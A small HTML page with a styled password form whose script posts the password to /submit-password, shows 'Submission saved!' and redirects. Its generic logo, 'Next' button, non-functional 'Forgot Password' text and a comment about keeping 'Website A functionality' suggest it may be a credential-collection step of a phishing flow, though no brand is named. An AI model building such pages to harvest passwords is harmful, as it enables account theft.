<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Password Page</title>
  <style>
    /* Body styling */
    body {
      background: #ffffff;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    /* Card container */
    .card {
      background: white;
      padding: 50px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      text-align: center;
      width: 90%;
      max-width: 350px;
      box-sizing: border-box;
    }

    /* Logo */
    img {
      width: 70px;
      display: block;
      margin: 0 auto 20px;
    }

    /* Heading */
     h2 {
      margin-bottom: 30px;
      margin-top: 5;
      color: #303030;
      font-weight: 550;
      letter-spacing: 0.5px;
    }

    /* Form inputs */
     label {
      display: block;
      margin-left: -5px;
      margin-bottom: 8px;
      font-weight: 600;
      font-size: 14px; 
      text-align: left;
      color: #6f6f6f;
    }

    input {
      width: 110%;
      margin-left: -5%;
      padding: 12px;
      margin-bottom: 5px;
      border-radius: 10px;
      border: 1px solid #ffe100;
      font-size: 16px;
      box-sizing: border-box;
    }

    /* Hint text */
    .hint {
      font-size: 16px;
      color: #4dafff;
      text-align: center;
      margin-bottom: 25px;
      font-weight: bold;
    }

    /* Button styling */
    button {
      width: 90px;
      padding: 13px;
      background-color: #4dafff;
      color: white;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      font-size: 16px;
      display: block;
      margin: 0 auto;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #0b7dda;
    }

    /* Responsive */
    @media (max-width: 400px) {
      .card { padding: 30px; }
      img { width: 120px; }
      h2 { font-size: 20px; }
      button { width: 80px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="logo2.png" alt="Logo">
    <h2>Enter Password</h2>
    <form id="passwordForm">
      <label for="password">Password</label>
      <input type="password" id="password"  required>
      <p class="hint">Forgot Password</p>
      <button type="next">Next</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('passwordForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const password = document.getElementById('password').value.trim();
      if (!password) { alert('Enter password'); return; }

      // Send password to backend (keeps Website A functionality)
      await fetch('/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password })
      });

      alert('Submission saved!');
      window.location.href = 'index.html'; // or next page
    });
  </script>
</body>
</html>
